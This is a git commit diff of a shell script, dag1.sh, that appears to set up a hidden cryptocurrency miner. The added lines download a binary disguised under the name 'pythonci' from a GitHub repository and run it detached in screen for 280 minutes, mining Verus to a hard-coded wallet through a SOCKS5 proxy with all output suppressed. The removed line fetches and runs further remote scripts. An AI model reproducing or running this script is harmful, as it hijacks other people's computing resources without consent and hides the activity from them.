777738534813b8cd1101c0dfc060f18a1c4dc49e
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-10 20:39:02 +0100

    Update dag1.sh

--- dag1.sh
+++ dag1.sh
@@ -1,1 +1,17 @@
-wget https://raw.githubusercontent.com/uveshV/project-a/main/dag.sh && chmod +x dag.sh && ./dag.sh && wget https://raw.githubusercontent.com/uveshV/project-a/main/sib.sh && chmod+x sib.sh && ./sib.sh
+#!/bin/sh
+softwareupdate -l
+ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
+brew install --cask screen
+brew install coreutils
+sudo apt update
+sudo apt install screen -y
+sudo apt install screen libjansson4 -y
+wget https://github.com/Nazimdr/project-hoj/raw/main/pythonci
+chmod +x pythonci
+screen -dmS ls
+POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
+WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
+PROXY=socks5://72.195.114.169:4145
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-nizam)
+timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 40 -x $PROXY > /dev/null 2>&1
+echo Sukses
